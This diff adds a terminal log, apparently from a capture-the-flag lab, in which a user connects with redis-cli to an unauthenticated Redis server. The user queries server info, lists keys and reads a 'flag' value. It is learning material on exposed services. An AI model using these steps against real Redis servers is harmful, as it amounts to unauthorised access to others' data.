@@ -1,0 +1,44 @@
+┌──(kali㉿kali)-[~/Documents/redeemer]
+└─$ redis-cli -h 10.129.118.186 -p 6379
+10.129.118.186:6379> info server
+# Server
+redis_version:5.0.7
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:66bd629f924ac924
+redis_mode:standalone
+os:Linux 5.4.0-77-generic x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:9.3.0
+process_id:743
+run_id:f168618ed0809ea77f2996453e0bdada2cd0ffbc
+tcp_port:6379
+uptime_in_seconds:2993
+uptime_in_days:0
+hz:10
+configured_hz:10
+lru_clock:5493384
+executable:/usr/bin/redis-server
+config_file:/etc/redis/redis.conf
+
+
+
+10.129.118.186:6379> info clients
+# Clients
+connected_clients:1
+client_recent_max_input_buffer:2
+client_recent_max_output_buffer:0
+blocked_clients:0
+
+
+10.129.227.233:6379> select 0
+OK
+10.129.227.233:6379> keys *
+1) "stor"
+2) "numb"
+3) "flag"
+4) "temp"
+10.129.227.233:6379> get flag
+"03e1d2b376c37ab3f5319922053953eb"
